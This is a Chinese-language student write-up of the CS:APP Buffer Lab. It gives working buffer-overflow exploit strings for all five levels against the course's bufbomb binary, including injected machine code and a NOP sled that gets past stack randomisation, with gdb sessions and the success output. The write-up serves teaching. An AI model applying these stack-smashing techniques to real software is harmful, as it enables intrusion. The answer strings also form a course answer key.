# BufferLab

## 前言

本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32)

本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略

本次实验采用 `bovik` 用户,cookie值为 `0x1005b2b7`

**需要 32 位工具链**

```bash
sudo apt-get install gcc-multilib
```

## 实验报告

本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档

### Level0

第一关的要求是返回到smoke,test调用了getbuf,getbuf的汇编如下

```txt
0x080491f4 <+0>:     push   %ebp
0x080491f5 <+1>:     mov    %esp,%ebp
0x080491f7 <+3>:     sub    $0x38,%esp
0x080491fa <+6>:     lea    -0x28(%ebp),%eax
0x080491fd <+9>:     mov    %eax,(%esp)
0x08049200 <+12>:    call   0x8048cfa <Gets>
0x08049205 <+17>:    mov    $0x1,%eax
0x0804920a <+22>:    leave
0x0804920b <+23>:    ret
```

这里的leave是x86汇编的指令,相当于

```txt
mov   %ebp, %esp
pop   %ebp
```

这里可以看出开辟的栈帧大小是0x38,实际用于输入的空间大小是0x28(40字节),但值得注意的是前面还 `push %ebp`,所以还有4字节

> 注意是32位机

可以查看到smoke的地址是 `0x08048c18`

所以第一关的答案是

```txt
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00
18 8c 04 08
```

```bash
$ ./hex2raw < 0.txt | ./bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
```

### Level1

第二关是跳转到fizz函数并且使得参数 rdi的值是cookie的值

反汇编fizz得到

```txt
0x08048c42 <+0>:     push   %ebp
0x08048c43 <+1>:     mov    %esp,%ebp              # ebp = esp
0x08048c45 <+3>:     sub    $0x18,%esp
0x08048c48 <+6>:     mov    0x8(%ebp),%eax         # eax = (rsp+8)
0x08048c4b <+9>:     cmp    0x804d108,%eax
0x08048c51 <+15>:    jne    0x8048c79 <fizz+55>
```

所以整个栈空间调用过程如图所示

![20221111014944](https://raw.githubusercontent.com/learner-lu/picbed/master/20221111014944.png)

所以答案如下

```txt
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00
42 8c 04 08
00 00 00 00
b7 b2 05 10
```

```bash
$ ./hex2raw < 1.txt | ./bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7
Type string:Fizz!: You called fizz(0x1005b2b7)
VALID
NICE JOB!
```

### Level2

调用函数 bang, 同时需要修改全局变量 global_value 的值

思路类似,返回地址设为栈指针地址,直接修改全局变量的值

反汇编bang找到global_value的地址为 `0x804d100`

```bash
(gdb) disas bang
Dump of assembler code for function bang:
   0x08048c9d <+0>:     push   %ebp
   0x08048c9e <+1>:     mov    %esp,%ebp
   0x08048ca0 <+3>:     sub    $0x18,%esp
   0x08048ca3 <+6>:     mov    0x804d100,%eax
```

构造的汇编如下, a.s

```x86asm
movl $0x1005b2b7,0x804d100
ret
```

`gcc -c -m32 a.s` 编译得到 a.o, 这是一个 32 位的 elf 文件

`objdump -d a.o` 反汇编得到的字节码如下

```txt
level2.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   c7 05 00 d1 04 08 b7    movl   $0x1005b2b7,0x804d100
   7:   b2 05 10
   a:   c3                      ret
```

通过打断点的方式得到下方的栈指针的值为 `0x55683588`

```bash
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x080491f4 <+0>:     push   %ebp
   0x080491f5 <+1>:     mov    %esp,%ebp
   0x080491f7 <+3>:     sub    $0x38,%esp
   0x080491fa <+6>:     lea    -0x28(%ebp),%eax
   0x080491fd <+9>:     mov    %eax,(%esp)
   0x08049200 <+12>:    call   0x8048cfa <Gets>
   0x08049205 <+17>:    mov    $0x1,%eax
   0x0804920a <+22>:    leave
   0x0804920b <+23>:    ret
End of assembler dump.
(gdb) b *0x080491fd
Breakpoint 1 at 0x80491fd
(gdb) r -u bovik
Starting program: /root/csapp/04Buffer Lab (IA32)/buflab-handout/bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7

Breakpoint 1, 0x080491fd in getbuf ()
(gdb) info r eax
eax            0x55683588       1432892808
```

然后得到bang的地址为 `0x08048c9d`,所以本题答案如下

```txt
c7 05 00 d1 04 08 b7 b2 05 10
c3 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00
88 35 68 55
9d 8c 04 08
```

```bash
$ ./hex2raw < 2.txt | ./bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7
Type string:Bang!: You set global_value to 0x1005b2b7
VALID
NICE JOB!
```

### Level3

本关要求仍返回到 test, 不过返回值要修改为 cookie

首先拿到test调用getbuf后原本的返回地址 `0x08048dbe`,接着注意到getbuf还push了ebp,所以我们还需要打断点得到ebp的值 `0x556835e0`

```bash
(gdb) info r ebp
ebp            0x556835e0       0x556835e0 <_reserved+1037792>
```

所以对应的汇编如下

```x86asm
movl $0x1005b2b7,%eax
movl $0x556835e0,%ebp
push $0x8048dbe
ret
```

字节码得到

```txt
level3.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   b8 b7 b2 05 10          mov    $0x1005b2b7,%eax
   5:   bd e0 35 68 55          mov    $0x556835e0,%ebp
   a:   68 be 8d 04 08          push   $0x8048dbe
   f:   c3                      ret
```

所以本关答案为

```txt
b8 b7 b2 05 10 bd e0 35 68 55
68 be 8d 04 08 c3 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00
88 35 68 55
```

```bash
$ ./hex2raw < 3.txt | ./bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7
Type string:Boom!: getbuf returned 0x1005b2b7
VALID
NICE JOB!
```

### Level4

本关就是栈地址的随机化,有一个+-240的偏差,所以不能准确的指定到某一个地址. 我们可以打一个断点来查看五次调用的时候的栈起始地址

```bash
(gdb) disas getbufn
Dump of assembler code for function getbufn:
   0x0804920c <+0>:     push   %ebp
   0x0804920d <+1>:     mov    %esp,%ebp
   0x0804920f <+3>:     sub    $0x218,%esp
   0x08049215 <+9>:     lea    -0x208(%ebp),%eax
   0x0804921b <+15>:    mov    %eax,(%esp)
   0x0804921e <+18>:    call   0x8048cfa <Gets>
   0x08049223 <+23>:    mov    $0x1,%eax
   0x08049228 <+28>:    leave
   0x08049229 <+29>:    ret
End of assembler dump.
(gdb) b *0x0804921b
Breakpoint 1 at 0x804921b
(gdb) r -u bovik -n
Starting program: /root/csapp/04Buffer Lab (IA32)/buflab-handout/bufbomb -u bovik -n
Userid: bovik
Cookie: 0x1005b2b7

Breakpoint 1, 0x0804921b in getbufn ()
(gdb) info r eax
eax            0x556833a8       1432892328
(gdb) c
Continuing.
Type string:a
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x0804921b in getbufn ()
(gdb) info r eax
eax            0x55683378       1432892280
(gdb) c
Continuing.
Type string:a
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x0804921b in getbufn ()
(gdb) info r eax
eax            0x556833d8       1432892376
(gdb) c
Continuing.
Type string:a
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x0804921b in getbufn ()
(gdb) info r eax
eax            0x55683368       1432892264
(gdb) c
Continuing.
Type string:a
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x0804921b in getbufn ()
(gdb) info r eax
eax            0x55683358       1432892248
(gdb) c
Continuing.
Type string:a
Dud: getbufn returned 0x1
Better luck next time
[Inferior 1 (process 11263) exited normally]
```

可以得到五次地址分别是 `0x556833a8` `0x55683378` `0x556833d8` `0x55683368` `0x55683358`,偏移范围是0x80

注意到本次缓冲区的长度是0x208(520字节),所以缓冲区的长度大于栈地址的偏移范围,所以我们可以将将返回地址设定为一个最大的栈起始地址,缓冲区全部使用nop指令,滑落到栈底(栈空间中的高位地址),然后执行我们的攻击代码

同时ebp的值虽然不确定,但是可以通过前后汇编得到ebp和esp的关系是ebp = esp+0x28

修改返回值eax为cookie,记录testn调用getbufn的返回地址`0x08048e3a`,所以可以构造攻击汇编代码

```x86asm
lea 0x28(%esp),%ebp
movl $0x1005b2b7,%eax
push $0x08048e3a
ret
```

字节码如下

```txt
level4.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   8d 6c 24 28             lea    0x28(%esp),%ebp
   4:   b8 b7 b2 05 10          mov    $0x1005b2b7,%eax
   9:   68 3a 8e 04 08          push   $0x8048e3a
   e:   c3                      ret
```

栈空间情况如下图所示

![20221111023303](https://raw.githubusercontent.com/learner-lu/picbed/master/20221111023303.png)

```txt
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90

90 90 90 90 90 8d 6c 24 28 b8
b7 b2 05 10 68 3a 8e 04 08 c3

00 00 00 00
d8 33 68 55
```

```bash
$ ./hex2raw < 4.txt -n | ./bufbomb -u bovik -n
Userid: bovik
Cookie: 0x1005b2b7
Type string:KABOOM!: getbufn returned 0x1005b2b7
Keep going
Type string:KABOOM!: getbufn returned 0x1005b2b7
Keep going
Type string:KABOOM!: getbufn returned 0x1005b2b7
Keep going
Type string:KABOOM!: getbufn returned 0x1005b2b7
Keep going
Type string:KABOOM!: getbufn returned 0x1005b2b7
VALID
NICE JOB!
```
